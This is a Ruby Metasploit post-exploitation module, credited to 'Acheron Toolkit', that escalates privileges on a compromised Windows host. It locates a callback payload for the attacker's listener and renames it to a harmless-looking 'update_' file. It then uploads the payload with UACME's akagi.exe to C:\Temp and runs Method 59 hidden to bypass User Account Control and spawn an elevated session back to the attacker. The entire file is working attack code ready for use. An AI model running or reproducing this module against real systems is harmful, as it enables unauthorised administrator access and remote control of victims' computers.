##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows UAC Bypass via Akagi Method 59',
      'Description'   => %q{
        UAC bypass using Akagi (UACME) Method 59 - Debug Object / PPID Spoofing.
        
        This module:
        1. Finds existing Acheron payload on attacker matching LHOST:LPORT
        2. Renames it with random name
        3. Uploads akagi.exe + payload to victim's C:\Temp
        4. Executes: akagi.exe 59 <payload_path>
        
        Result: Elevated Administrator (High Integrity), NOT SYSTEM.
        
        Requires akagi.exe on attacker machine (UACME compiled binary).
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Acheron Toolkit' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'URL', 'https://github.com/hfiref0x/UACME' ],
          [ 'URL', 'https://github.com/f1zm0/acheron' ]
        ]
    ))

    register_options(
      [
        OptString.new('LHOST', [ true, 'Listener IP for payload', '0.0.0.0' ]),
        OptInt.new('LPORT', [ true, 'Listener port for payload', 4445 ]),
        OptString.new('AKAGI_PATH', [ false, 'Path to akagi.exe on attacker', '' ]),
        OptString.new('PAYLOAD_NAME', [ false, 'Custom payload name (random if empty)', '' ])
      ])
  end

  def run
    print_status("Starting UAC Bypass via Akagi Method 59 (Elevated Admin)")

    # Check if we're already SYSTEM
    if is_system?
      print_good("Already running as SYSTEM")
      return
    end

    # Generate random payload name
    payload_name = datastore['PAYLOAD_NAME'].empty? ? "update_#{Time.now.to_i}_#{rand(1000..9999)}.exe" : datastore['PAYLOAD_NAME']

    # FIND the existing Acheron payload matching LHOST:LPORT - FIX #7, #8
    print_status("Searching for existing Acheron payload for LHOST=#{datastore['LHOST']} LPORT=#{datastore['LPORT']}...")
    existing_payload = find_matching_acheron_payload
    
    unless existing_payload && ::File.exist?(existing_payload)
      print_error("No existing Acheron payload found for LHOST=#{datastore['LHOST']} LPORT=#{datastore['LPORT']}!")
      return
    end

    # COPY and RENAME the existing payload - FIX #4: single copy operation
    print_status("Copying existing payload to #{payload_name}...")
    ::FileUtils.cp(existing_payload, "/tmp/#{payload_name}")
    
    unless ::File.exist?("/tmp/#{payload_name}")
      print_error("Failed to copy payload")
      return
    end

    print_good("Copied #{existing_payload} -> /tmp/#{payload_name}")

    # Get akagi.exe path - FIX #5: safe env var handling
    akagi_local = datastore['AKAGI_PATH']
    if akagi_local.empty?
      # Try default locations using safe env var access
      search_paths = []
      search_paths << File.join(ENV.fetch('ACHERON_TOOLKIT_DIR', ''), 'bin', 'akagi.exe') unless ENV['ACHERON_TOOLKIT_DIR'].nil? || ENV['ACHERON_TOOLKIT_DIR'].empty?
      search_paths << File.join(ENV['HOME'], '.local', 'share', 'acheron-toolkit', 'bin', 'akagi.exe')
      search_paths << '/root/.local/share/acheron-toolkit/bin/akagi.exe'
      
      search_paths.each do |path|
        if ::File.exist?(path)
          akagi_local = path
          break
        end
      end
    end
    
    unless akagi_local && ::File.exist?(akagi_local)
      print_error("akagi.exe not found! Set AKAGI_PATH option or place at default location (~/.local/share/acheron-toolkit/bin/akagi.exe).")
      return
    end
    
    print_status("Using akagi.exe from #{akagi_local}")
    print_status("File size: #{::File.size(akagi_local)} bytes")

    # Use C:\Temp on victim
    akagi_remote = "C:\\\\Temp\\\\akagi.exe"
    payload_remote = "C:\\\\Temp\\\\#{payload_name}"

    print_status("Using target directory: C:\\Temp")

    # Create C:\Temp directory on target
    print_status("Creating C:\\Temp directory on target...")
    session.fs.dir.mkdir("C:\\Temp") rescue nil

    # Verify local files exist
    unless ::File.exist?(akagi_local) && ::File.readable?(akagi_local)
      print_error("Local akagi.exe not readable: #{akagi_local}")
      return
    end
    
    print_status("Local akagi.exe verified: #{akagi_local} (#{::File.size(akagi_local)} bytes)")

    # Upload akagi.exe via meterpreter upload command
    print_status("Uploading akagi.exe via meterpreter upload command...")
    session.console.run_single("upload #{akagi_local} 'C:\\\\Temp\\\\akagi.exe'")
    print_good("akagi.exe uploaded successfully")

    # Verify upload
    begin
      stat = session.fs.file.stat("C:\\\\Temp\\\\akagi.exe")
      print_good("akagi.exe uploaded successfully (#{stat.size} bytes)")
    rescue => e
      print_error("Upload verification failed: #{e.message}")
      return
    end

    # Upload renamed payload to victim
    print_status("Uploading payload #{payload_name} via meterpreter upload command...")
    session.console.run_single("upload /tmp/#{payload_name} 'C:\\\\Temp\\\\#{payload_name}'")
    print_good("Payload uploaded successfully")

    # Verify payload upload
    begin
      stat = session.fs.file.stat("C:\\\\Temp\\\\#{payload_name}")
      print_good("Payload uploaded successfully (#{stat.size} bytes)")
    rescue => e
      print_error("Payload upload verification failed: #{e.message}")
      return
    end

    # Execute UAC bypass using akagi.exe Method 59
    print_status("Executing Akagi Method 59 on victim...")
    print_status("Executing: C:\\\\Temp\\\\akagi.exe 59 C:\\\\Temp\\\\#{payload_name}")
    
    # Execute via shell command - akagi.exe 59 <payload_path>
    cmd = "C:\\\\Temp\\\\akagi.exe 59 C:\\\\Temp\\\\#{payload_name}"
    result = session.sys.process.execute("cmd.exe", "/c #{cmd}", { 'Hidden' => true, 'Channelized' => true })

    # Clean up local temp files
    ::File.delete("/tmp/#{payload_name}") if ::File.exist?("/tmp/#{payload_name}")

    print_good("Akagi Method 59 executed! Check for new Elevated Admin (High Integrity) session.")
  end

  def find_matching_acheron_payload
    # Look for Acheron payloads matching LHOST:LPORT in filename - FIX #7, #8
    search_paths = [
      ENV['ACHERON_TOOLKIT_DIR'] || '/root/acheron-toolkit/',
      ENV['HOME'] + '/acheron-toolkit/',
      ENV['HOME'] + '/.local/share/acheron-toolkit/',
      '/tmp/acheron-gen/',
      ENV['HOME'] + '/',
      '/root/',
      Dir.pwd
    ]

    target_host = datastore['LHOST']
    target_port = datastore['LPORT'].to_s
    
    # Sanitize for filename matching
    sanitized_host = target_host.gsub(/[^a-zA-Z0-9._-]/, '_')
    sanitized_port = target_port.gsub(/[^0-9]/, '_')
    pattern = "acheron_#{sanitized_host}_#{sanitized_port}.exe"

    search_paths.each do |path|
      if ::File.exist?(path)
        Dir.glob(File.join(path, pattern)).each do |f|
          if ::File.exist?(f) && ::File.size(f) > 100000
            print_status("Found matching payload: #{f} (#{::File.size(f)} bytes)")
            return f
          end
        end
        
        # Fallback: any acheron_*.exe if exact match not found
        Dir.glob(File.join(path, 'acheron_*.exe')).each do |f|
          if ::File.exist?(f) && ::File.size(f) > 100000
            print_status("Found fallback payload: #{f} (#{::File.size(f)} bytes)")
            return f
          end
        end
      end
    end
    return nil
  end
end